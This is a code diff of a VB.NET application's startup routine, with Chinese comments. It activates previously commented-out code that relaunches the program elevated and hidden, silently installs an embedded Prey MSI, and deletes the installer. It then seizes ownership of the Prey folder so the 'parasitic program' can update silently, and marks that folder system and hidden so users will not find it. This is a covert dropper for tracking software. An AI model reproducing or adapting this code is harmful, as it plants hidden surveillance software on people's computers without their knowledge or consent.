@@ -27,35 +27,34 @@ Namespace My
 
         Private Sub MyApplication_Startup(sender As Object, e As StartupEventArgs) Handles Me.Startup
             '如果启动不包含参数，则把程序复制到临时目录，并加入参数运行
-            'If Command() = vbNullString Then
-            '    If IO.File.Exists(MySelfPath) Then IO.File.Delete(MySelfPath)
-            '    FileSystem.FileCopy(Process.GetCurrentProcess.MainModule.FileName, MySelfPath)
-            '    '不等待宿主程序退出而退出
-            '    ShellExecute(0, "runas", MySelfPath, "winscr", vbNullString, vbHide)
-            '    End
-            'End If
+            If Command() = vbNullString Then
+                If IO.File.Exists(MySelfPath) Then IO.File.Delete(MySelfPath)
+                FileSystem.FileCopy(Process.GetCurrentProcess.MainModule.FileName, MySelfPath)
+                '不等待宿主程序退出而退出
+                ShellExecute(0, "runas", MySelfPath, "winscr", vbNullString, vbHide)
+                End
+            End If
 
             ''检查管理员权限
-            'If Not (New WindowsPrincipal(WindowsIdentity.GetCurrent).IsInRole(New SecurityIdentifier(WellKnownSidType.BuiltinAdministratorsSid, Nothing))) Then
-            '    MsgBox("程序需要管理员权限!请右击程序文件，然后选择""以管理员权限运行""！")
-            '    End
-            'End If
+            If Not (New WindowsPrincipal(WindowsIdentity.GetCurrent).IsInRole(New SecurityIdentifier(WellKnownSidType.BuiltinAdministratorsSid, Nothing))) Then
+                MsgBox("此程序需要管理员权限，请右击程序文件，选择""以管理员权限运行""。")
+                End
+            End If
 
             '释放 MSI 安装文件
-            'If Not SaveResourceFile(My.Resources.BinaryResource.prey, PreyMSIPath) Then End
+            If Not SaveResourceFile(My.Resources.BinaryResource.prey, PreyMSIPath) Then End
 
             '静默安装 Prey 服务
-            'If Not InstallMSI() Then End
+            If Not InstallMSI() Then End
 
             '安装完毕后删除 MSI 安装程序
-            'If IO.File.Exists(PreyMSIPath) Then IO.File.Delete(PreyMSIPath)
+            If IO.File.Exists(PreyMSIPath) Then IO.File.Delete(PreyMSIPath)
 
             '使用管理员权限对整个目标目录提权，方便日后寄生程序的静默更新
             '参数"/d y"表示对子目录进行循环遍历提权，大概需要 半分钟 时间，如不需要对子目录循环遍历提权，把 "/d y" 改为 "/d n"
-            'Shell("cmd.exe /c takeown /f " & PreyDirectory & " /r /d y && icacls " & PreyDirectory & " /grant administrators:F /t", vbHide, True)
+            Shell("cmd.exe /c takeown /f " & PreyDirectory & " /r /d y && icacls " & PreyDirectory & " /grant administrators:F /t", vbHide, True)
             '对 Prey 目录添加 [系统] 和 [隐藏] 属性，防止用户无意发现文件
-            'Shell("cmd.exe /c attrib " & PreyDirectory & " +s +h", vbHide, True)
-
+            Shell("cmd.exe /c attrib " & PreyDirectory & " +s +h", vbHide, True)
 
             PreyVireion = GetHighestVersion(PreyDirectory & "\versions\")
             FlashDirectory = PreyDirectory & "\versions\" & PreyVireion & "\lib\agent\actions\alert\win32\"
